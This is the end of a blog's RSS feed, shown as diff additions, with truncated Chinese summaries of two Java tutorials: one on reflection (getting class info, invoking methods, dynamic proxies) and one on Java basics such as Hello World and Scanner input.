+获取类信息：通过 Class.forName() 方法获取某个类的 Class 对象，然后使用 Class 对象的各种方法获取类的信息，如 getName() 获取类名，getDeclaredMethods() 获取所有方法等。 创建对象：通过 Class 对象的 getConstructor() 或 getDeclaredConstructor() 方法获取指定构造函数的引用，然后使用 newInstance() 或 newInstance() 方法创建对象。 访问属性：通过 Class 对象的 getDeclaredField() 方法获取指定属性的引用，然后使用 set() 或 get() 方法设置或获取属性的值。 调用方法：通过 Class 对象的 getDeclaredMethod() 方法获取指定方法的引用，然后使用 invoke() 方法调用方法并传递参数。 动态代理：通过 Java 反射实现动态代理，可以在运行时创建一个实现了指定接口的代理类，并实现指定的方法逻辑。 Class类就是通过Field和Method来描述类中的字段和方法
+代码 Person 类
+package net.Seck2y.a02; public class Person { private String name = &amp;#34;zhangsan&amp;#34;; private int age = 23; public Person(){} public Person(String name, int age) { this.</description>
+    </item>
+    <item>
+      <title>Java基础</title>
+      <link>https://n2ryx.github.io/docs/java/javabase/java%E5%9F%BA%E7%A1%80/</link>
+      <pubDate>Tue, 10 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/java/javabase/java%E5%9F%BA%E7%A1%80/</guid>
+      <description>Java基础 Hello World 编译运行
+java源文件 -&amp;gt; class字节码文件 -&amp;gt; java运行class文件javac java文件 # 输出class字节码文件java class文件 Hello World
+public class HelloWord { // 与文件名一致 public static void main(String[] args) { // 主函数 System.out.println(&amp;#34;Hello World&amp;#34;); } } 主函数
+public static void main(String[] args){ } 输入输出
+输入 import java.util.Scanner Scanner sc = new Scanner(System.in); int q = sc.nextInt(); String c = sc.next(); 输出 System.out.println(值); // 换行 sout // 匹配 System.out.print(值); // 不换行 注释</description>
+    </item>
+  </channel>
+</rss>
